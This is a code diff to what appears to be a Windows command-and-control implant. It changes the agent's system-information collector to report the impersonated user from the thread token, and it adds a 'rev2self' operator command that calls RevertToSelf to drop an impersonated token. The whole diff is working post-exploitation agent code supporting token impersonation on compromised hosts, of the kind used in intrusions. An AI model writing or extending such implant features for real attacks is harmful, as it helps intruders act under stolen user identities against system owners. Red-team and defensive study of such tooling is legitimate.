@@ -62,9 +62,12 @@ void sysinfo_collect(Buffer *tlv_out) {
     if (GetComputerNameA(buf, &size))
         tlv_add_string(tlv_out, TLV_HOSTNAME, buf);
 
-    /* Username (DOMAIN\user) */
+    /* Username (DOMAIN\user) — use thread token if impersonating */
     HANDLE hToken;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+    BOOL gotToken = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
+    if (!gotToken)
+        gotToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+    if (gotToken) {
         DWORD token_len;
         GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
         unsigned char *token_buf = (unsigned char *)malloc(token_len);
@@ -596,6 +599,15 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
             free(cmd_str);
         } else {
             buf_append(&out, "No command specified\n", 20);
+        }
+    }
+    else if (strcmp(name, "rev2self") == 0) {
+        if (RevertToSelf()) {
+            buf_append(&out, "[+] Reverted to process token\n", 30);
+        } else {
+            char err[128];
+            snprintf(err, sizeof(err), "[-] RevertToSelf failed (err=%u)\n", (unsigned)GetLastError());
+            buf_append(&out, err, (DWORD)strlen(err));
         }
     }
     else {
